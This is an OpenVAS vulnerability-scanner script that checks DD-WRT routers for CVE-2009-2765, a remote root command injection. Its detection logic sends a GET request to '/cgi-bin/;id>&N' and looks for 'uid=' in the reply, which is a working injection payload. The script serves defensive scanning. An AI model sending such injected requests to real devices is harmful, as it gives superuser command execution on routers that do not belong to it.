###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dd_wrt_35742.nasl 11 2013-10-27 10:12:02Z jan $
#
# DD-WRT Web Management Interface Remote Arbitrary Shell Command Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103792";

tag_insight = "httpd.c in httpd in the management GUI in DD-WRT 24 sp1, and other
versions before build 12533, allows remote attackers to execute arbitrary commands
via shell metacharacters in a request to a cgi-bin/ URI";

tag_impact = "Remote attackers can exploit this issue to execute arbitrary shell
commands with superuser privileges, which may facilitate a complete
compromise of the affected device.";

tag_affected = "DD-WRT v24-sp1 is affected; other versions may also be vulnerable.";

tag_summary = "DD-WRT is prone to a remote command-injection vulnerability because it
fails to adequately sanitize user-supplied input data.";

tag_solution = "Vendor fixes are available.";
tag_vuldetect = "Try to execute the 'id' command via HTTP GET request.";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(35742);
 script_cve_id("CVE-2009-2765");
 script_version ("$Revision: 11 $");
 script_tag(name:"cvss_base", value:"8.3");
 script_tag(name:"cvss_base_vector", value:"AV:A/AC:L/Au:N/C:C/I:C/A:C");

 script_name("DD-WRT Web Management Interface Remote Arbitrary Shell Command Injection Vulnerability");

 desc = "
Summary:
" + tag_summary + "

Vulnerability Detection:
" + tag_vuldetect + "

Vulnerability Insight:
" + tag_insight + "

Impact:
" + tag_impact + "

Affected Software/OS:
" + tag_affected + "

Solution:
" + tag_solution;

 script_xref(name:"URL", value:"http://www.securityfocus.com/bid/35742");
 script_xref(name:"URL", value:"http://dd-wrt.com/dd-wrtv3/index.php");
 script_xref(name:"URL", value:"http://www.dd-wrt.com");
 script_xref(name:"URL", value:"http://www.heise.de/ct/artikel/Aufstand-der-Router-1960334.html");
 
 script_tag(name:"risk_factor", value:"Critical");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
 script_tag(name:"creation_date", value:"2013-09-23 13:51:05 +0200 (Mon, 23 Sep 2013)");
 script_description(desc);
 script_summary("Determine if it is possible to execute the id command");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "affected" , value : tag_affected);
  }

 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

banner = get_http_banner(port:port);
if("Server: httpd" >!< banner)exit(0);

for(i=5;i<=7;i++) {

  req = 'GET /cgi-bin/;id>&' + i + ' HTTP/1.0\r\n\r\n'; 
  res = http_send_recv(port:port, data:req, bodyonly:FALSE);

  if("uid=" >< res && "gid=" >< res) {
     
    security_hole(port:port);
    exit(0);

  }
}

exit(0);

